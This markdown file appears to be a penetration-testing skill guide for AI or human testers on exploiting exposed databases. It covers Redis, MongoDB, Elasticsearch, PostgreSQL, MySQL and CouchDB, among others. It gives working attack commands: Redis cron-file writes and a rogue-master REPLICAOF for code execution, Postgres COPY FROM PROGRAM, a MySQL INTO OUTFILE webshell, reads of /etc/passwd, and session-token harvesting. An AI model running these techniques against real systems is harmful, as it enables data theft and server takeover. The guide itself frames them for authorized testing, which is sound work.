---
name: exposed_databases
description: Testing unauthenticated and weakly-authenticated database services (Redis, MongoDB, Elasticsearch, PostgreSQL, MySQL, Cassandra, CouchDB, Memcached) for data exposure and RCE
---

# Exposed Databases

Databases reachable from the tested network without authentication - or with default credentials - are among the highest-impact findings: full data access, and in several engines direct file write/RCE. These services usually appear during port scans (`naabu`/`nmap`) on non-web ports, or via SSRF to internal hosts. Test each engine with its native protocol tooling, keep reads minimal, and prefer non-destructive proof.

## Attack Surface

- Redis (6379), MongoDB (27017), Elasticsearch/OpenSearch (9200/9300), PostgreSQL (5432), MySQL/MariaDB (3306), Cassandra (9042), CouchDB (5984), Memcached (11211), Neo4j (7474/7687), InfluxDB (8086), ClickHouse (8123/9000), MS SQL (1433), Oracle (1521)
- Bind addresses: `0.0.0.0`, Docker host-mapped ports, Kubernetes NodePorts, cloud security-group mistakes
- Access paths: direct network, SSRF (see `ssrf`), pivots from compromised hosts, cloud instances with permissive groups
- Data of interest: credentials, PII, tokens, configs, cached sessions, audit logs

## Reconnaissance

1. **Discover**: port sweep with `naabu -top-ports 1000`, `nmap -sV` for service fingerprints, banner grabs (`nc -vz`, `curl` for HTTP-ish services)
2. **Fingerprint each service** - version matters for known CVEs and RCE paths
3. **Test auth**: connect with no credentials first, then default/weak sets per engine (root/root, admin/admin, postgres/postgres, neo4j/neo4j, redis with `requirepass` absent)
4. **Check network exposure context** - is the port only reachable internally (SSRF/pivot needed) or directly?
5. **Source-aware**: hunt connection strings in `.env`, configs, CI vars for the credentials to reuse

## Key Vulnerabilities

### Redis (6379)

No `requirepass` (or weak password) means full command access:

```
redis-cli -h <host> INFO                      # server info, version, roles
redis-cli -h <host> CONFIG GET dir
redis-cli -h <host> CONFIG GET dbfilename
```

**File write -> RCE** (runs as the Redis user, often root in containers):

```
redis-cli -h <host> CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h <host> CONFIG SET dbfilename root
redis-cli -h <host> SET x "\n* * * * * <command>\n"
redis-cli -h <host> SAVE
```

Alternatives: `~/.ssh/authorized_keys` (SSH key), web root webshell, `/etc/cron.d/`. **Master-replica**: `REPLICAOF <attacker> 6379` against a rogue Redis master can push arbitrary commands/file content (works when `SLAVEOF`/`REPLICAOF` not renamed). Lua `EVAL` executes server-side code but is sandboxed.

### MongoDB (27017)

No auth (or `authSource` misconfig) -> full CRUD:

```
mongosh "mongodb://<host>:27017"
show dbs
use <db>; db.getCollectionNames()
db.<coll>.find().limit(50)
```

Check `admin.system.users` for hashes, `$where`/`$function` (server-side JS) for execution primitives, and replica-set configs for cluster-wide access. See `nosql_injection` for app-layer operator injection.

### Elasticsearch / OpenSearch (9200)

HTTP JSON API, no auth:

```
curl -s http://<host>:9200/
curl -s http://<host>:9200/_cat/indices?v
curl -s http://<host>:9200/_all/_search?size=50
curl -s http://<host>:9200/_cat/nodes?v
```

Data of interest: logs with credentials/tokens, `.kibana`/`.security` indices, snapshot configs. Historical script RCE (`_search` script fields) and log4j (CVE-2021-44228) paths on old versions; version-gate before testing.

### PostgreSQL (5432)

Default `postgres/postgres` or trust auth:

```
psql -h <host> -U postgres
\l
\dt
SELECT * FROM pg_catalog.pg_tables;
```

**File read**: `SELECT pg_read_file('/etc/passwd');` (superuser, `pg_read_server_files`). **RCE**: `COPY <table> FROM PROGRAM 'id';` (superuser) or `COPY ... TO PROGRAM`. Also `dblink`/`lo_import`/`lo_export` for file interaction.

### MySQL / MariaDB (3306)

Root with empty/weak password:

```
mysql -h <host> -u root
SHOW DATABASES;
SELECT user,host,authentication_string FROM mysql.user;
```

**File read**: `SELECT LOAD_FILE('/etc/passwd');` (FILE priv). **File write/RCE**: `SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/x.php';` (FILE priv + writable dir). UDF libraries for command execution on specific configs.

### CouchDB (5984)

```
curl -s http://<host>:5984/
curl -s http://<host>:5984/_all_dbs
curl -s http://<host>:5984/_utils/        # Fauxton UI
```

Historical unauth admin bypass (CVE-2017-12635/12636) on old versions; `_config`/`_node` endpoints leak config; `_users` db contains password hashes.

### Cassandra (9042)

```
cqlsh <host>
DESCRIBE KEYSPACES;
```

No auth by default on many deployments; check roles (`LIST ROLES`) and authz gaps.

### Memcached (11211)

```
printf 'stats\n' | nc <host> 11211
printf 'stats items\n' | nc <host> 11211
printf 'get <key>\n' | nc <host> 11211
```

Sessions/cache data readable; UDP amplification vector (abuse only with authorization).

### Neo4j (7474/7687)

Default `neo4j/neo4j`; browser console at `http://<host>:7474/browser/`; Bolt on 7687. Test default creds, then Cypher queries for data and config.

## Advanced Techniques

- **Session/cache harvesting**: Redis/Memcached often cache auth sessions - a single `KEYS *`/`stats items` + `get` can yield live session tokens
- **Credentials in data**: search for `password`, `secret`, `token`, `api_key` across collections/indices/tables
- **Cloud metadata pivot**: from a compromised DB host's shell (Redis cron/Postgres COPY), query `169.254.169.254` (see `ssrf`, `aws`, `gcp`, `azure`)
- **Lateral movement**: reuse found credentials against the app, SSH, and other services
- **Sharding/cluster**: Redis Cluster/ES cluster APIs expose all nodes - enumerate the full cluster from one open node
- **TLS detection**: some DBs accept plaintext and TLS on the same port; check both

## Testing Methodology

1. Sweep ports, fingerprint each service, note version
2. Test unauthenticated access, then default credentials
3. Enumerate data catalogs (dbs/indices/tables/keys) before touching contents
4. Sample small amounts of data; search for credentials/tokens
5. Test file-read/RCE paths only with authorization and with minimal proof (read a benign file, echo a marker)
6. Document exact connection strings/commands for reproducibility

## Validation

1. Show the unauthenticated/default-credential connection succeeding and a catalog listing
2. Demonstrate data access with a small, redacted sample that proves sensitivity (live session token, credentials, PII)
3. For RCE paths: version-gate and use a benign proof (`id`, marker file in a temp location when possible)
4. Confirm the exposure is reachable from the tested position (direct or via SSRF/pivot) - the path matters for severity

## False Positives

- Service answers a banner but rejects commands without auth (Redis `NOAUTH`, Mongo auth enabled, ES 401)
- Port open but filtered/timing out on actual commands
- Default creds changed (postgres/postgres fails) - no finding
- Data store contains only test/sample data with no production value (still a misconfig finding, lower severity)
- SSRF reachable but egress to the DB blocked by network rules (no data access)

## Impact

- Complete data breach (credentials, PII, tokens)
- RCE on the database host (Redis/Postgres/MySQL paths) -> pivot into the network
- Session hijacking via cached session material
- Supply-chain/credential reuse into other systems

## Pro Tips

1. Enumerate the catalog before sampling data - it proves scope and keeps the footprint small
2. Redis `CONFIG GET dir` + `SAVE` is the classic container RCE; check the Redis user/OS before firing file writes
3. Look for session/credential material first - it is often the highest-value data in caches
4. Version-gate the historical CVEs (CouchDB 1.x/2.x, ES script engine, log4j)
5. Pair with `ssrf`, `nosql_injection`, `weak_password_detection`, and the cloud skills for pivots
6. Never dump entire databases; sample + document is enough to prove impact

## Summary

Exposed databases are data-and-RCE goldmines: authenticate freely or with defaults, enumerate the catalog, sample credential/token material, and version-gate the file-write/RCE paths. Prove reachability and impact with minimal, redacted evidence.
